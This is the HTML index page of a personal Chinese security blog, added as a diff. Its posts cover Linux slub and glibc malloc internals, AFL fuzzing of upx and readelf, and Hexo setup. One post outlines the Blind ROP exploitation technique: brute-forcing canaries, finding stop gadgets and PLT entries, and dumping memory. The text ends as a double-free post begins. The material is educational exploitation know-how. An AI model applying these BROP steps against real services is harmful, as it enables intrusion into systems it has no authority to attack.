@@ -1,0 +1,999 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>Another&#39;s blog</title>
+  <meta name="author" content="another" />
+
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  
+  <meta property="og:site_name" content="Another&#39;s blog" />
+
+  
+  
+
+  
+    <meta property="og:image" content="" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Another&#39;s blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper">
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/sulb/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/sulb/">slub</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>slub机制彻底图解分析<br>转载 2017年01月27日 08:57:17标签：slub机制 /slab机制 /linux /kernel /内存管理1333</p>
+<pre><code>内核管理页面使用了2个算法：伙伴算法和slub算法，伙伴算法以页为单位管理内存，但在大多数情况下，程序需要的并不是一整页，而是几个、几十个字节的小内存。于是需要另外一套系统来完成对小内存的管理，这就是slub系统。slub系统运行在伙伴系统之上，为内核提供小内存管理的功能。
+
+ slub把内存分组管理，每个组分别包含2^3、2^4、...2^11个字节，在4K页大小的默认情况下，另外还有两个特殊的组，分别是96B和192B，共11组。之所以这样分配是因为如果申请2^12B大小的内存，就可以使用伙伴系统提供的接口直接申请一个完整的页面即可。
+
+ slub就相当于零售商，它向伙伴系统“批发”内存，然后在零售出去。一下是整个slub系统的框图：
+
+
+
+  一切的一切源于kmalloc_caches[12]这个数组，该数组的定义如下：
+</code></pre><pre><code>struct kmem_cache kmalloc_caches[PAGE_SHIFT] __cacheline_aligned;
+</code></pre><pre><code>每个数组元素对应一种大小的内存，可以把一个kmem_cache结构体看做是一个特定大小内存的零售商，整个slub系统中共有12个这样的零售商，每个“零售商”只“零售”特定大小的内存，例如：有的“零售商”只&quot;零售&quot;8Byte大小的内存，有的只”零售“16Byte大小的内存。
+
+每个零售商(kmem_cache)有两个“部门”，一个是“仓库”：kmem_cache_node，一个“营业厅”：kmem_cache_cpu。“营业厅”里只保留一个slab，只有在营业厅(kmem_cache_cpu)中没有空闲内存的情况下才会从仓库中换出其他的slab。
+所谓slab就是零售商(kmem_cache)批发的连续的整页内存，零售商把这些整页的内存分成许多小内存，然后分别“零售”出去，一个slab可能包含多个连续的内存页。slab的大小和零售商有关。
+</code></pre><p>相关数据结构：</p>
+<pre><code>    物理页按照对象(object)大小组织成单向链表，对象大小时候objsize指定的。例如16字节的对象大小，每个object就是16字节，每个object包含指向下一个object的指针，该指针的位置是每个object的起始地址+offset。每个object示意图如下：
+
+
+void*指向的是下一个空闲的object的首地址，这样object就连成了一个单链表。
+向slub系统申请内存块(object)时：slub系统把内存块当成object看待
+
+slub系统刚刚创建出来，这是第一次申请。    
+此时slub系统刚建立起来，营业厅(kmem_cache_cpu)和仓库(kmem_cache_node)中没有任何可用的slab可以使用，如下图中1所示：
+因此只能向伙伴系统申请空闲的内存页，并把这些页面分成很多个object，取出其中的一个object标志为已被占用，并返回给用户，其余的object标志为空闲并放在kmem_cache_cpu中保存。kmem_cache_cpu的freelist变量中保存着下一个空闲object的地址。上图2表示申请一个新的slab，并把第一个空闲的object返回给用户，freelist指向下一个空闲的object。
+
+slub的kmem_cache_cpu中保存的slab上有空闲的object可以使用。
+这种情况是最简单的一种，直接把kmem_cache_cpu中保存的一个空闲object返回给用户，并把freelist指向下一个空闲的object。
+
+
+slub已经连续申请了很多页，现在kmem_cache_cpu中已经没有空闲的object了，但kmem_cache_node的partial中有空闲的object 。所以从kmem_cache_node的partial变量中获取有空闲object的slab，并把一个空闲的object返回给用户。
+
+
+kmem_cache_cpu中已经都被占用的slab放到仓库中，kmem_cache_node中有两个双链表，partial和full，分别盛放不满的slab(slab中有空闲的object)和全满的slab(slab中没有空闲的object)。然后从partial中挑出一个不满的slab放到kmem_cache_cpu中。
+
+kmem_cache_cpu中中找出空闲的object返回给用户。
+
+
+slub已经连续申请了很多页，现在kmem_cache_cpu中保存的物理页上已经没有空闲的object可以使用了，而此时kmem_cache_node中没有空闲的页面了，只能向内存管理器(伙伴算法)申请slab。并把该slab初始化，返回第一个空闲的object。
+
+
+kmem_cache_node中没有空闲的object可以使用，所以只能重新申请一个slab。
+
+
+
+把新申请的slab中的一个空闲object返回给用户使用，freelist指向下一个空闲object。
+向slub系统释放内存块(object)时，如果kmem_cache_cpu中缓存的slab就是该object所在的slab，则把该object放在空闲链表中即可，如果kmem_cache_cpu中缓存的slab不是该object所在的slab，然后把该object释放到该object所在的slab中。在释放object的时候可以分为一下三种情况：
+
+object在释放之前slab是full状态的时候（slab中的object都是被占用的），释放该object后，这是该slab就是半满（partail）的状态了，这时需要把该slab添加到kmem_cache_node中的partial链表中。
+
+
+
+slab是partial状态时（slab中既有object被占用，又有空闲的），直接把该object加入到该slab的空闲队列中即可。
+该object在释放后，slab中的object全部是空闲的，还需要把该slab释放掉。
+这一步产生一个完全空闲的slab，需要把这个slab释放掉。
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/afl/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/afl/">afl</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>afl-fuzz技术初探<br>目录</p>
+<p>安装lzma-sdk<br>安装ucl<br>安装zlib<br>编译upx</p>
+<p>正文</p>
+<p>afl-fuzz技术初探<br>转载请注明出处:<a href="http://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">http://www.cnblogs.com/WangAoBo/p/8280352.html</a></p>
+<p>参考了:</p>
+<p><a href="http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/</a></p>
+<p><a href="http://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">http://blog.csdn.net/youkawa/article/details/45696317</a></p>
+<p><a href="https://stfpeak.github.io/2017/06/12/AFL-Cautions/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/06/12/AFL-Cautions/</a></p>
+<p><a href="http://blog.csdn.net/abcdyzhang/article/details/53487683" target="_blank" rel="noopener">http://blog.csdn.net/abcdyzhang/article/details/53487683</a></p>
+<h1 id="安装afl"><a href="#安装afl" class="headerlink" title="安装afl"></a>安装afl</h1><pre><code>下载最新源码
+解压并安装:
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash $make $sudo make all</span><br></pre></td></tr></table></figure>
+<h2 id="有源码的afl-fuzz"><a href="#有源码的afl-fuzz" class="headerlink" title="有源码的afl-fuzz"></a>有源码的afl-fuzz</h2><pre><code>这里以fuzz upx为例进行测试
+
+编译upx
+upx项目地址([*https://github.com/upx/upx*)
+因为afl会对有源码的程序进行重新编译,因此需要修改upx的Makefile
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$git clone https://github.com/upx/upx.git</span><br><span class="line">$cd upx</span><br><span class="line">$vim Makefile</span><br><span class="line">CC = /usr/local/bin/afl-gcc #添加此句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd src</span><br><span class="line">$vim Makefile</span><br><span class="line">CXX    ?= /usr/local/bin/afl-g++ #将CXX改成afl-g++</span><br></pre></td></tr></table></figure>
+<h3 id="安装lzma-sdk"><a href="#安装lzma-sdk" class="headerlink" title="安装lzma-sdk"></a>安装lzma-sdk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$git submodule update --init --recursive</span><br></pre></td></tr></table></figure>
+<h3 id="安装ucl"><a href="#安装ucl" class="headerlink" title="安装ucl"></a>安装ucl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash $cd ucl-1.03 $./configure $make $sudo make install</span><br><span class="line">bash $export UPX_UCCLDIR=&quot;~/ucl-1.03&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$wget http://pkgs.fedoraproject.org/repo/pkgs/zlib/zlib-1.2.11.tar.xz/sha512/b7f50ada138c7f93eb7eb1631efccd1d9f03a5e77b6c13c8b757017b2d462e19d2d3e01c50fad60a4ae1bc86d431f6f94c72c11ff410c25121e571953017cb67/zlib-1.2.11.tar.xz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd zlib-1.2.11/</span><br><span class="line">$./configure</span><br><span class="line">$sudo make install</span><br></pre></td></tr></table></figure>
+<h3 id="编译upx"><a href="#编译upx" class="headerlink" title="编译upx"></a>编译upx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~/upx</span><br><span class="line">$make all</span><br></pre></td></tr></table></figure>
+<p>此时可在/src目录下找到upx.out文件<br>对upx进行fuzz测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~</span><br><span class="line">$mkdir afl_in afl_out</span><br></pre></td></tr></table></figure>
+<p>afl_in存放测试用例,afl_out存放fuzz结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cp /usr/bin/file afl_in</span><br><span class="line">$afl-fuzz -i afl_in -o afl_out ~/upx/src/upx.out @@</span><br></pre></td></tr></table></figure></p>
+<p>@@会代替测试样本,即相当于执行了upx.out file</p>
+<p>对于从stdin获取输入的程序,可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># afl-fuzz -i afl_in -o afl_out ./file</span><br></pre></td></tr></table></figure></p>
+<h2 id="无源码的afl-fuzz"><a href="#无源码的afl-fuzz" class="headerlink" title="无源码的afl-fuzz"></a>无源码的afl-fuzz</h2><pre><code>对无源码的程序进行fuzz一般有两种方法:
+对二进制文件进行插桩
+使用-n选项进行传统的fuzz测试
+这里主要介绍第一种,该方法是通过afl-qemu实现的.
+</code></pre><p>编译afl版的qemu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd qemu_mode </span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure></p>
+<p>另外需要把afl加入环境变量<br>例如：编辑/etc/profile文件，添加CLASSPATH变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/profile </span><br><span class="line">export CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib</span><br></pre></td></tr></table></figure></p>
+<h3 id="对readelf进行fuzz"><a href="#对readelf进行fuzz" class="headerlink" title="对readelf进行fuzz"></a>对readelf进行fuzz</h3><p>以readelf为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$mkdir afl_in afl_out</span><br><span class="line">$cp test afl_in</span><br><span class="line">test为自己准备的测试elf</span><br><span class="line">$sudo cp /usr/bin/readelf .</span><br><span class="line">$afl_fuzz -i afl_in -o afl_out -Q readelf -a @@</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/glibc malloc和free/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/glibc malloc和free/">glibc malloc和free</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="主arena"><a href="#主arena" class="headerlink" title="主arena"></a>主arena</h1><pre><code>heap和arena
+根据他们在堆中出现的次序，第一个是heap_info，即Heap这个结构的元数据，即它本身拥有的用来指示在它上面的操作的数据。
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _heap_info &#123;</span><br><span class="line">mstate ar_ptr; /* 这个heap所在的arena */</span><br><span class="line">struct _heap_info *prev; /* 上一个heap */</span><br><span class="line">size_t size; /* 字节为单位的当前大小 */</span><br><span class="line">char pad[-5 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; /* 用于对齐 */ </span><br><span class="line">&#125;heap_info;</span><br></pre></td></tr></table></figure>
+<pre><code>从这个结构当中，
+我们可以推断出heap和arena是有一个对应关系的，
+以及prev指针说明了heap本身是由一个链表连接的，
+事实上是一个循环单链表。
+</code></pre><h1 id="state结构"><a href="#state结构" class="headerlink" title="state结构"></a>state结构</h1><pre><code>或者叫mstate，
+虽然名称似乎和arena没有关系，
+但是其实这个结构是用来表示arena的。
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state &#123;</span><br><span class="line">mutex_t mutex; /* 同步访问相关，互斥锁 */</span><br><span class="line">int flags; /* 标志位，以前是max_fast，在一些老的文章上可能还使用的这个说法，比如phrack */</span><br><span class="line">mfastbinptr fastbins[NFASTBINS]; /* fastbins，之后会说到,是一个chunk的链表 */</span><br><span class="line">mchunkptr top; /* top chunk，一个特殊的chunk，在之后会说到 */</span><br><span class="line">mchunkptr last_remainder; /* 最后一次拆分top chunk得到的剩余内容，之后会说到 */</span><br><span class="line">mchunkptr bins[BINS * 2]; /* bins，一个chunk的链表的数组，之后会说到 */</span><br><span class="line">unsigned int binmap[BINMAPSIZE]; /* bins是否为空的一个位图 */</span><br><span class="line">struct malloc_state *next; /* 链表，下一个malloc_state的位置 */</span><br><span class="line">INTERNAL_SIZE_T system_mem;</span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Mutex"><a href="#Mutex" class="headerlink" title="Mutex"></a>Mutex</h2><pre><code>用来保证同步，在调用一个函数，比如malloc的时候，
+其实调用的是public_xxx的函数，
+而这个函数的认为就是先试图进行加锁，
+这个锁就是这里的mutex了，然后再调用_int_xxx函数，
+这个函数才是真正的内部实现。
+</code></pre><h2 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h2><pre><code>用来表示一些当前arena的特征，比如是否有fastbin chunk存在，内存是否是非连续的等等。
+</code></pre><h2 id="fasbins-…"><a href="#fasbins-…" class="headerlink" title="fasbins[…]"></a>fasbins[…]</h2><pre><code>这个数组存的是fastbin的链表，
+每一个数组中的元素对应一个fastbin的链表，
+bin为chunk的链表，保存没有被使用的chunk，
+用来避免多次使用系统调用分配。总共有4种bin，
+包括fastbin,small bin, large bin和unsorted bin,
+主要用于分配，在分配的时候，会根据大小去查找到相应的bin，
+然后通过在bin中删除某一个块来进行分配。
+Fastbin是4种bin中唯一使用单链表表示的bin
+</code></pre><h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><pre><code>top chunk，较为特殊的一个chunk，
+虽然其数据结构(后文会谈到的chunk的结构)和一般chunk无异，
+但是他相当于堆可用内存的一个边界，
+是唯一一个可以自行增长的chunk，
+每当在各个bin当中去找空余的内存找不到的时候就会来这儿取一个块，
+剩下的就是remainder块，也是新的top块
+</code></pre><h2 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last_remainder"></a>last_remainder</h2><pre><code>上面的top chunk已经谈到了，
+其实就是从top chunk当中分出去之后剩下的那一个块
+</code></pre><h2 id="bins-…"><a href="#bins-…" class="headerlink" title="bins[…]"></a>bins[…]</h2><pre><code>在fastbin的解释当中我们提到了有4种bin，
+由于只有fastbin是单链表表示，所以fastbin是单独表示的，
+其他bin则都使用了这个bins数组，下标1是unsorted bin，
+2到63是small bin，64到126是large bin，共126个bin。
+</code></pre><h2 id="bitmap-…"><a href="#bitmap-…" class="headerlink" title="bitmap[…]"></a>bitmap[…]</h2><pre><code>表示bin数组当中某一个下标的bin是否为空，
+用来在分配的时候加速 .next 
+下一个arena，是一个循环单链表
+</code></pre><h2 id="system-mem和max-system-mem"><a href="#system-mem和max-system-mem" class="headerlink" title="system_mem和max_system_mem"></a>system_mem和max_system_mem</h2><pre><code>用来跟踪当前被系统分配的内存总量，
+INTERNAL_SIZE_T数据类型在大多数系统上都是size_t
+</code></pre><h1 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h1><hr>
+<p>32位中chunk结构为</p>
+<p>4字节前一个堆块大小</p>
+<p>4字节本堆块size（最后三位flag）</p>
+<p>快表中</p>
+<p>[</p>
+<p>4字节（不使用堆块的情况下前一个堆块指针）</p>
+<p>]</p>
+<p>非快表</p>
+<p>[</p>
+<p>4字节（不使用堆块的情况下前一个堆块指针）</p>
+<p>4字节（不使用堆块的情况下后一个堆块指针）</p>
+<p>]</p>
+<p>64位翻倍</p>
+<h1 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h1><hr>
+<pre><code>第一步：如果进程没有关联的分配区，
+就通过sysmalloc从操作系统分配内存mmap 
+
+第二步：从fastbin查找对应大小的chunk并返回（效验下一块是否存在），
+如果失败进入第三步。 
+
+第三步：从smallbin查找对应大小的chunk并返回,
+如果分配失败将fastbin中的空闲chunk合并放入unsortedbin中，
+进入第四步。
+（如果前一个空闲则unlink前一个然后合并，
+然后检查下一个是否空闲。
+如果相邻的下一个chunk不是top chunk，
+并且下一个chunk不在使用中，
+就继续合并，否则，就清除下一个chunk的PREV_INUSE，
+表示该chunk已经空闲了。 然后将刚刚合并完的chunk添加进unsorted_bin中，
+unsorted_bin也是一个双向链表。 ） 
+
+第四步：遍历unsortedbin，
+从unsortedbin中查找对应大小的chunk
+并返回如果满足拆开的大小则拆成两部分，
+后面部分放回unsortedbin，
+根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。
+进入第五步。 
+
+第五步：从largebin指定位置查找对应大小的chunk并返回，
+如果失败进入第六步。 
+
+第六步：从largebin中大于指定位置的双向链表中
+查找对应大小的chunk并返回，如果失败进入第七步。 
+
+第七步：从topchunk中分配对应大小的chunk并返回，
+topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk
+如果有，就合并fastbin中的chunk并加入到unsortedbin中，
+然后跳回第四步。如果fastbin中没有空闲chunk，
+就通过sysmalloc从操作系统分配内存。
+
+sysmalloc先试图扩大top chunk，如果失败就申请一个新的topchunk
+并释放原来的topchunk。如果申请新的则扩大阈值
+</code></pre><h1 id="free"><a href="#free" class="headerlink" title="free"></a>free</h1><hr>
+<pre><code>下面对整个_int_free函数做个总结。 
+首先检查将要释放的chunk是否属于fastbin，
+如果属于就将其添加到fastbin中
+（检查下一块的大小是    否为合理的数值）。 
+然后检查该chunk是否是由mmap分配的，
+如果不是找前一个unlink合并，
+就根据其下一个chunk的类型添加到unsortedbin
+或者合并到top chunk中。 
+接着，如果释放的chunk的大小大于一定的阀值，
+就需要通过systrim缩小主分配区的大小，
+或者通过heap_trim缩小非主分配区的大小。
+ （检查unsortbin是否完好无损）
+最后如果该chunk是由mmap的分配的，
+通过munmap_chunk释放。
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/brop/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/brop/">brop</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="BROP的使用环境："><a href="#BROP的使用环境：" class="headerlink" title="BROP的使用环境："></a>BROP的使用环境：</h2><pre><code>不能直接构造ROP gadget
+目标服务在崩溃后会重新运行
+</code></pre><h2 id="Canary不会重置，没有ASLR"><a href="#Canary不会重置，没有ASLR" class="headerlink" title="Canary不会重置，没有ASLR"></a>Canary不会重置，没有ASLR</h2><pre><code>这是因为Blind ROP其实核心部分都是类似于爆破的概念，  
+因此会不断的引起目标服务崩溃，挂起，如果崩溃后不能重新启动，  
+且启动后Canary或者其他地址改变，那么之前的爆破也就无意义了。  
+那么BROP每一步在做什么呢。
+</code></pre><h2 id="爆破Canary："><a href="#爆破Canary：" class="headerlink" title="爆破Canary："></a>爆破Canary：</h2><pre><code>当我们获取到崩溃长度后，根据
+Canary-&gt;EBP-&gt;Ret
+的栈结构，我们可以开始爆破Canary，爆破的方法就是一字节一字节爆破。
+</code></pre><h2 id="获取Hang-addr和PLT："><a href="#获取Hang-addr和PLT：" class="headerlink" title="获取Hang addr和PLT："></a>获取Hang addr和PLT：</h2><pre><code>随后就是找hang gadget了，这个也叫stop gadget。
+这种特殊的地址，既不会造成Nginx崩溃，也不会造成Nginx返回内容，
+而是让进程进入无限循环，挂起或者sleep的状态，
+它是我们后面寻找BROP gadget的重要依据。
+plt的原理和hang gadget很像。
+在这之前我大概说一下为什么找plt的原理和hang gadget很像。
+plt项是连续的，而且在0字节，和6字节之后执行的内容都会正常进入后续处理，
+而不会崩溃或有返回，因此只要连续有多个16字节都会让进程block且每个16字节地址+6之后，
+也会block，那么这就有可能是个plt项。
+</code></pre><h2 id="找到BROP-gadget："><a href="#找到BROP-gadget：" class="headerlink" title="找到BROP gadget："></a>找到BROP gadget：</h2><pre><code>接下来，有了hang gadget，我们就可以找到BROP gadget了，这个BROPgadget，是我们组成在开头提到通过write方法dump内存的重要部分，
+和ROP gadget的概念很像，为了组成这个write函数，需要三个参数，
+也就是需要三个ROP gadget：
+pop rdi,ret; 
+pop rsi,ret;  
+pop rdx,ret;
+因为在64位Linux中，参数不是靠push寄存器入栈决定的，
+而是由寄存器本身决定的，这三个参数对应的就是rdi，rsi和rdx寄存器中的内容。
+因此我们利用hang gadget来暴力搜索这些BROPgadget，如何判断呢？
+在ret后放很多hangaddr，只要命中pop ret，pop pop ret这种gadget，都会进入block状态，通过这种方法，我们找到6个pop ret，就能找到一个在linux下常见的结构，通过计算这个结构的偏移，
+就能得到pop rsi,ret和pop rdi,ret了。
+</code></pre><h2 id="找到strcmp-plt和write-plt"><a href="#找到strcmp-plt和write-plt" class="headerlink" title="找到strcmp plt和write plt"></a>找到strcmp plt和write plt</h2><pre><code>这一步完成后，我们就需要进行strcmp和write对应plt项的查找了，
+为什么要找strcmp呢，因为strcmp的汇编功能是对rdx赋予一个长度值，
+通过这种方法可以对rdx，
+也就是第三个参数赋值，因为在.text字段中很难找到pop rdx,ret这样的gadget。
+找这两个plt项，需要利用这两个plt项的特性，
+比如strcmp就是对比两个字符串内容。如果两个字符串相等，
+没有崩溃，且不相等，crash的话，这就是一个strcmp。
+</code></pre><h2 id="Dump内存，执行shellcode"><a href="#Dump内存，执行shellcode" class="headerlink" title="Dump内存，执行shellcode"></a>Dump内存，执行shellcode</h2><pre><code>跳出内存完成正常攻击，
+或者使用libcdatabase找出libc版本
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/hexo/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/hexo/">搭建博客</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>使用环境 node.js（hexo）  github</p>
+<h2 id="安装所有软件"><a href="#安装所有软件" class="headerlink" title="安装所有软件"></a>安装所有软件</h2><pre><code>官网下载node.js。
+</code></pre><h2 id="初始化文件"><a href="#初始化文件" class="headerlink" title="初始化文件"></a>初始化文件</h2><pre><code>下载安装后，进入一个空目录输入如下代码：
+</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo init limedroid.github.io</span><br><span class="line"><span class="meta">$</span> cd limedroid.github.io</span><br><span class="line"><span class="meta">$</span> npm install</span><br></pre></td></tr></table></figure>
+<h2 id="更换喜欢的主题"><a href="#更换喜欢的主题" class="headerlink" title="更换喜欢的主题"></a>更换喜欢的主题</h2><pre><code>找到相应的主题
+git clone https://github.com/iissnan/hexo-theme-next themes/next
+到本地
+更改根目录下的_config.yml
+theme: 新主题的名字
+</code></pre><h2 id="进行预览"><a href="#进行预览" class="headerlink" title="进行预览"></a>进行预览</h2><pre><code>分为清除编译预览三部分。
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
+<h2 id="进行部署"><a href="#进行部署" class="headerlink" title="进行部署"></a>进行部署</h2><pre><code>部署需要做相应的准备，打开根目录下的_config.yml，将最后一部分改为如下格式
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt;</span><br><span class="line">  branch: [branch]</span><br></pre></td></tr></table></figure>
+<p>注意冒号后要加上空格</p>
+<p>然后执行命令部署</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>git需要添加用户和邮箱才能执行成功，网址为<a href="https://another1024.github.io/" target="_blank" rel="noopener">https://another1024.github.io/</a></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/doublefree/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/doublefree/">double free</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
